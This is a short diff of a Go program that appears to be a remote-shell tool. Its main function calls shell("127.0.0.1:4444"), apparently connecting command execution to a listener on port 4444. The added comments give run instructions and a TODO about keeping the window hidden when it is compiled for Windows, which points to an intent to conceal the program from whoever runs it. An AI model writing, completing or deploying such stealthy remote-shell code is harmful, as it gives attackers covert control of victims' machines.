@@ -9,6 +9,8 @@ import (
 	"os/exec"
 )
 
+// to run, use go run
+// if compiling to a windows binary, the window will need to stay open and be hidden <---- TODO?
 func main() {
 	shell("127.0.0.1:4444")
 }
